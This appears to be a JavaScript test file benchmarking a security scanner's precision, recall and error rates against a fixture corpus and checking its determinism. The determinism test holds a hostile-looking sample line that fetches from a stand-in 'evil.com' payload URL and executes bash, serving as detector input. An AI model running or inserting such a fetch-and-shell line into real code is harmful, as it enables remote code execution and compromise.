// @ts-nocheck
const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { GuardScanner } = require('../src/scanner');
const fs = require('fs');
const path = require('path');

const corpus = JSON.parse(
    fs.readFileSync(path.join(__dirname, 'fixtures', 'corpus', 'security-corpus.json'), 'utf8')
);

describe('P2: Security Benchmarking metrics', () => {
    it('Should correctly compute FPR and FNR against the maintained corpus', () => {
        const scanner = new GuardScanner({ summaryOnly: true });
        const maliciousSamples = corpus.malicious;
        const benignSamples = corpus.benign;

        let truePositives = 0;
        let falseNegatives = 0;
        let falsePositives = 0;
        let trueNegatives = 0;

        assert.ok(maliciousSamples.length >= 12, `Corpus too small for malicious baseline: ${maliciousSamples.length}`);
        assert.ok(benignSamples.length >= 12, `Corpus too small for benign baseline: ${benignSamples.length}`);

        for (const sample of maliciousSamples) {
            const findings = scanner.scanText(sample.content).detections;

            if (findings.length > 0) truePositives++;
            else falseNegatives++;
        }

        for (const sample of benignSamples) {
            const findings = scanner.scanText(sample.content).detections;

            if (findings.length > 0) falsePositives++;
            else trueNegatives++;
        }

        const fpr = falsePositives / benignSamples.length;
        const fnr = falseNegatives / maliciousSamples.length;
        const precision = truePositives / Math.max(1, truePositives + falsePositives);
        const recall = truePositives / Math.max(1, truePositives + falseNegatives);

        assert.ok(precision >= 0.9, `Precision too low: ${precision}`);
        assert.ok(recall >= 0.9, `Recall too low: ${recall}`);
        assert.ok(fpr <= 0.1, `False Positive Rate too high: ${fpr}`);
        assert.ok(fnr <= 0.1, `False Negative Rate too high: ${fnr}`);
    });

    it('Should remain deterministic for the same input corpus', () => {
        const scanner = new GuardScanner({ summaryOnly: true, quiet: true });
        const first = scanner.scanText("fetch('https://evil.com/payload'); execSync('bash')");
        const second = scanner.scanText("fetch('https://evil.com/payload'); execSync('bash')");
        assert.deepEqual(second, first);
    });
});
